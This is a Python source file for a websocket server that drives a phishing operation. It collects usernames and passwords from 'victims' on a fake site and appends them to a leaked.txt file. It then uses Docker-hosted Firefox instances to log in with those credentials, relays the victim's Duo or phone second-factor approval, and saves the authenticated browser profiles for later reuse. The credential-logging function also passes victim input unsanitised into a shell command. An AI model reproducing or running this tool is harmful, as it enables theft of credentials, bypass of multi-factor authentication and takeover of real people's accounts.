#!/usr/bin/env python

# WS server example that synchronizes state across clients

import ssl
import pathlib
import threading
import asyncio
import json
import websockets
import random
import os
import signal
import sys
import time
import re

try: 
    from containers import docker
except: 
    from backend.containers import docker

# The main websocket server that is the middle man between victim and docker
# containers. Orchestrates containers, handles sessions, etc. 
class SocketServer(): 
    def __init__(self, host, hostname, firefox_path):
        self.firefox_home = firefox_path
        self.backends = docker.Manager(hostname)
        self.sessions = {}
        self.host = host

    def leakcred(self, usr, pas, bid):
        os.system("echo '{}\t\t{}\t\t{}' >> ../../leaked.txt".format(usr, pas, bid))

    def start_server(self):
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        key = os.path.abspath(
            os.path.join(os.path.dirname(__file__), '../ssl/key.pem'))
        crt = os.path.abspath(
            os.path.join(os.path.dirname(__file__), '../ssl/cert.pem'))
        self.log("Using key", key)
        self.log("Using certificate", crt)
        ssl_context.load_cert_chain(crt, keyfile=key)

        server = websockets.serve(self.main, self.host, 80, ssl=ssl_context)
        server2 = websockets.serve(self.main, self.host, 79)

        self.log('Starting Socket Server on Port 80')
        signal.signal(signal.SIGINT, self.signal_handler)
        asyncio.get_event_loop().run_until_complete(server)
        asyncio.get_event_loop().run_forever()

    def signal_handler(self, signal, frame):
        self.backends.close_all()
        time.sleep(1)
        self.log("Closed all docker instances.",
            "Ctrl+C again to close any remaining threads")
        sys.exit(0)

    def log(self, *args):
        print("[*] SOCKET_SERVER\t" + " ".join(map(str,args)))
    
    # Claims backend for session SID
    async def claim_backend(self, SID, usr, pas):
        try:
            bid = self.backends.claim_backend(SID, usr, pas) 
            if bid == -1: 
                self.log("No backends available")
                await self.sessions[SID]["victim"].close()

            if SID in self.sessions.keys():
                self.sessions[SID]["bid"] =     bid
            else:
                self.log("Session", SID, "has died, so will release backend", 
                    bid, "that was just assigned to it")
                self.backends.release_backend(bid)
        finally:
            pass

    # Saves a container on succesful flow 
    def save_container(self, name, bid):
        try:
            # wait for victim to close connection by itself
            path = "/docker/appdata/firefoxSID" + str(bid) + "/profile"
            self.log("Appending profile", name, "with path", path, "to", 
                self.firefox_home + "/profiles.ini")
            with open(self.firefox_home + "/profiles.ini", "r+") as profiles_file:
                profiles = profiles_file.read()
                next_num = max([int(x.split("e")[1]) for x in re.findall("Profile\d+", profiles)]) + 1
                profiles += "\n\n[Profile{}]\nName={}\nIsRelative=0\nPath={}".format(next_num, name, path)
                profiles_file.seek(0, os.SEEK_SET)
                profiles_file.write(profiles)
            self.backends.stop_backend(bid, name)
        finally:
            pass

    # Usually called from HTTPS server. This creates a session and 
    # starts up a backend
    async def add_session(self, SID, usr, pas, victim=None):
        self.sessions[SID] = {
                        "victim" : victim, 
                        "backend": None, 
                        "bid"    : None, 
                        "user"   : usr,
                        "pass"   : pas,
                        "authm"  : None,
                        "authReady" : False,
                        "succ"   : False
        }
        await self.claim_backend(SID, usr, pas)

    
    # Main websocket event handler
    async def main(self, websocket, path):
        self.log("Websocket connected:", websocket,";", path)
        try:
            async for message in websocket:
                if websocket.state == 3: continue
                data = json.loads(message)

                # If it's a ping request, respond with a pong
                if "ping" in data.keys():
                    await websocket.send(json.dumps({"pong":"pong"}));
                    continue

                self.log("RECEIVED: ", data)

                if "auth" in data.keys(): 
                    continue

                if data["id"] == "victim": 
                    # victim gave us credentials. Create new session
                    # and start a backend
                    if data["action"] == "registerVictim":
                        SID = data["sid"]
                        if SID in self.sessions.keys(): 
                            self.sessions[SID]["victim"] = websocket
                            self.sessions[SID]["authm"] = None
                            self.log("Victim with SID", SID, "and BID", 
                                self.sessions[SID]["bid"], "reconnected")
                            await self.sessions[SID]["victim"] \
                                .send(json.dumps({"status":"validCreds"}));
                            continue

                        self.log("Created new session", SID, "starting auth")

                        # leak kerb/pass to file just in case
                        self.leakcred(data["username"], data["password"], "in progress")

                        # run this on separate thread to avoid blocking message pool
                        #await self.claim_backend(SID, data["username"], data["password"])
                        await self.add_session(
                            SID, 
                            data["username"], 
                            data["password"], 
                            websocket)
                            
                    # Victim set his authentication method (phone or duo push), send
                    if data["action"] == "setAuthMethod":
                        SID = data["sid"]
                        self.sessions[SID]["authm"] = data["authm"]
                        if self.sessions[SID]["authReady"] == True:
                            self.log("backend is ready, so sending auth method") 
                            await self.sessions[SID]["backend"].send(
                                json.dumps({
                                    "status":"selected", 
                                    "method": self.sessions[SID]["authm"]}))
                        else: 
                            self.log("backend", self.sessions[SID]["bid"], 
                                "is NOT ready, waiting to send auth method")

                    if data["action"] == "cancelPressed":
                        SID = data["sid"]       
                        await self.sessions[SID]["backend"].send(json.dumps(data))

                elif data["id"] == "backend":
                    SID = data["sid"]
                    if SID not in self.sessions.keys(): 
                        break

                    # a new backend connected 
                    if "action" in data and data["action"] == "requestVictim":
                        if SID in self.sessions.keys():
                            self.sessions[SID]["backend"] = websocket
                        else:
                            self.log("Failed to assign this new container to", 
                                "the victim, for it has died already")

                    # Invalid credentials supplied. Release backend from session
                    if "status" in data and data["status"] == "invalidCreds":
                        self.backends.release_backend(self.sessions[SID]["bid"])
                        del self.sessions[SID]

                    # backend validated given credentials. Send it auth method
                    # if user already decided it or set flag to ready whenever 
                    # user deciedes
                    if "status" in data and data["status"] == "waitingForAuthm":
                        self.sessions[SID]["authReady"] = True
                        self.log("Setting authready to true for", SID, 
                            ". Authm is: ", self.sessions[SID]["authm"])
                        if self.sessions[SID]["victim"] is not None:
                            await self.sessions[SID]["victim"].send(json.dumps(data))
                        if self.sessions[SID]["authm"] is not None:
                            await self.sessions[SID]["backend"].send(json.dumps({
                                "status":"selected", 
                                "method": self.sessions[SID]["authm"]}))

                    # User logged in succesfully in the docker container. 
                    # Mission accomplished. 
                    if "status" in data and data["status"] == "loggedIn":
                        self.log("Session SID<->BID<->USR :", SID + "<->" + 
                            str(self.sessions[SID]["bid"]) 
                                + self.sessions[SID]["user"], "successful.")

                        # leak kerb/pass to file just in case
                        self.leakcred(self.sessions[SID]["user"], self.sessions[SID]["pass"], data["bid"])

                        self.sessions[SID]["succ"] = True
                        bid = data["bid"]
                        name = self.sessions[SID]["user"]

                        await self.sessions[SID]["victim"] \
                            .send(json.dumps({"status":"loggedIn"}));

                        self.save_container(name, bid)

                    # User answered call. Reflect this on the victim's side
                    if "status" in data and data["status"] == "callAnswered":
                        await self.sessions[SID]["victim"].send(json.dumps(data))

        # Catch buggers
        except Exception as e:
            self.log("Caught exception:", e)
            victim = None
            backend = None
            for SID in list(self.sessions.keys()):
                if self.sessions[SID]["backend"] is websocket: 
                    backend = SID
                if self.sessions[SID]["victim"] is websocket:
                    victim = SID
            if victim is not None: 
                self.log("The culprit that caused this crash was the VICTIM",
                    "assosciated with SID:", SID, "and BID:", 
                    self.sessions[SID]["bid"])
            if victim is not None: 
                self.log("The culprit that caused this crash was the BACKEND",
                    "assosciated with SID:", SID, "and BID:", 
                    self.sessions[SID]["bid"])
        finally:
            # unregister websocket that died
            for SID in list(self.sessions.keys()):

                # victim moved away from fake catsoup site
                if self.sessions[SID]["victim"] is websocket:
                    self.log("victim", SID, "closing...")
                    if self.sessions[SID]["succ"]:
                            self.log("this victim was succesful. Not releasing backend.")
                    else:
                            self.backends.release_backend(self.sessions[SID]["bid"])
                    del self.sessions[SID]

                # backend session died for some reason. Try to restart
                elif self.sessions[SID]["backend"] is websocket:
                    self.log("backend SID<->BID :", SID + "<->" + str(self.sessions[SID]['bid']), "died.")
                    self.sessions[SID]["backend"] = None
                    self.backends.release_backend(self.sessions[SID]["bid"])
                    if self.sessions[SID]["succ"] is False: 
                        self.log("session wasn't succesfull, so retrying. Assigning new backend")
                        self.sessions[SID]["bid"] = self.claim_backend(SID, self.sessions[SID]["user"], self.sessions[SID]["pass"])

if __name__ == "__main__":
    SocketServer(sys.argv[1], sys.argv[2], sys.argv[3])
